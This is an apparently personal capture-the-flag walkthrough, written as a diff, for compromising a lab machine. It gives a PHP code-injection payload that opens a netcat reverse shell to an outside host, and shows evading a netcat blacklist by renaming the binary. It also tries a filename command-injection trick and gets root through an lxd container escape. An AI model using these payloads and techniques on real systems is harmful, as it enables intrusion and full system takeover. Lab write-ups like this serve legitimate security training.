@@ -1,0 +1,61 @@
+1. gobuster 
+	gobuster dir -u 10.10.10.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 25 -o log.txt
+
+2. We see an admin.php page that has a password if view the source page all the way to the right. Use that
+   in conjunction with the user being "admin".
+
+3. We can write html and it parses it. Can get code execution by writing php code in user query box.
+   We get immediate code execution: <?php system('ls -la'); ?>
+
+4. We try to execute the following however out shell dies:
+	GET /admin.php?html=<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 1234 >/tmp/f'); ?> HTTP/1.1
+
+	After which we attempt to find the root cause of this so we do a find on the file that was last
+	modified with ctime: find /home -ctime -60
+	This spits out a file under /home/xalvas/intrusions letting us know after looking at the contents 
+	of the file, that nc is being blacklisted so next best thing to do is make a copy of netcat with
+	a different name: cp /bin/nc /dev/shm/mc
+
+	GET /admin.php?html=<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/mc 10.10.14.36 1234 >/tmp/f '); ?> HTTP/1.1
+
+	Don't forget url encode all the strings being sent.
+
+5. We now have a working shell.
+6. We got xalvas directory and discover 3 different mp3 and wav files. Move them arround with modified nc.
+7. Check the files, rick roll singing. Next use audio diff install with pip
+	pip install audiodiff
+   The files are not the same, might be a stego challenge. Replay inverse of wav file? Maybe. Use audacity.
+   Import file and check effects, invert.
+		Your password is 18547936..*
+  This password is for the xalvas user, you may now ssh into the box as such user.
+
+8. There is a binary in app direcoty called goodluck, this a setuid binary the needs to be exploted via 
+   various buffer overflows. However we will try to get code execution by taking advantage of the nc 
+   blacklisting to see if we can get code execution when triggering the binary.
+   	touch -- 'nc $(sleep 100)'
+	cp /bin/nc nc\ \$\(sleep\ 100\)
+	chmod 755 nc\ \$\(sleep\ 100\)
+	./nc\ \$\(sleep\ 100\) -lnvp 1337
+	
+   This does not however work.
+
+9. Unintended root: (lxd containers) boot2root issue.
+   Creating an alpine linux image 
+	git clone https://github.com/saghul/lxd-alpine-builder.git 
+	scp alpine-v3.11-i686-20200123_0308.tar.gz xalvas@10.10.10.27:~
+	#### CReates machine template inside host ###
+	lxc image import alpine-v3.11-i686-20200123_0308.tar.gz --alias alpine
+	lxc image list
+	lxc init alpine privesc -c security.privileged=true
+	### go into config adding device device to container privesc device to add host-root with type disk
+	lxc config device add privesc host-root disk source=/ path=/mnt/root/
+
+   Mow to get root on lxc device
+	lxc start privesc
+	lxc exec privesc /bin/sh
+	~ # cd /mnt/root/
+   We can now access the filesystem and cat the root.txt file
+
+	MORAL of the story, be careful with virtualization technology. Installing the technology may allow
+	users with sudo privielges to be erroneously added and grant the ability to access places they 
+	should not have access to.
